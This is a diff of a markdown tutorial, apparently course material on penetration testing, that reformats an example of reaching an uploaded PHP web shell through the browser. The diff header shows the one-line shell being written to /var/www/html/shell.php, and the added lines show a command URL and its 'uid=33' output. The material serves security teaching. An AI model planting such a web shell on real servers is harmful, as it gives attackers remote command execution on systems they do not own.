@@ -219,4 +219,11 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 #### Step 3: Accessing our Web Shell
 Once we've written and uploaded the web shell, we can access it either through the browser or using `cURL`:
 ##### Browser
-We visit the `shell.php` page and use `?cmd=[command]` to execute our commands. for e`http://SERVER_IP:PORT/shell.php?cmd=id` 
+We visit the `shell.php` page and use `?cmd=[command]` to execute our commands. for example:
+
+```URL
+http://SERVER_IP:PORT/shell.php?cmd=id
+
+[]
+uid=33
+``` 
